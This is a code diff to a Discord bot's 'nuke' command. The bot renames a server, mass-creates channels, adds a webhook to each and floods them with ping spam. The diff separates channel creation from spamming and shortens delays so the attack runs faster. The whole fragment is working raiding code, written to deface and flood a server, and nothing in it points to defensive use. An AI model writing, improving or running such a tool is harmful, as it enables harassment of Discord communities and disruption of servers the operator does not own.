@@ -64,27 +64,34 @@ async def nuke(ctx):
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Create channels and spam
-    print(f"Creating {channels_to_create} channels and spamming {pings_per_channel} times each...")
+    # Step 1: Create channels and save them in a list
+    created_channels = []
+    print(f"Creating {channels_to_create} channels...")
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
+            created_channels.append(channel)
             print(f"Created channel: {channel.name}")
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.2)  # Reduced delay here
+        except Exception as e:
+            print(f"❌ Failed to create channel {i}: {e}")
 
+    # Step 2: Create webhooks and spam pings in each channel
+    print(f"Starting spam: sending {pings_per_channel} pings per channel...")
+    for channel in created_channels:
+        try:
             webhook = await channel.create_webhook(name=webhook_name)
             print(f"Created webhook in {channel.name}")
-
             for ping_count in range(pings_per_channel):
                 try:
                     await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                     if (ping_count + 1) % 10 == 0:
                         print(f"Sent {ping_count + 1} pings in {channel.name}")
-                    await asyncio.sleep(0.1)
+                    await asyncio.sleep(0.1)  # Keep ping delay fast
                 except Exception as e:
-                    print(f"❌ Webhook send failed in channel {channel.name} at ping {ping_count + 1}: {e}")
+                    print(f"❌ Webhook send failed in {channel.name} at ping {ping_count + 1}: {e}")
         except Exception as e:
-            print(f"❌ Failed to create/spam channel {i}: {e}")
+            print(f"❌ Failed to create webhook/spam in channel {channel.name}: {e}")
 
     print("✅ NUKE complete.")
 
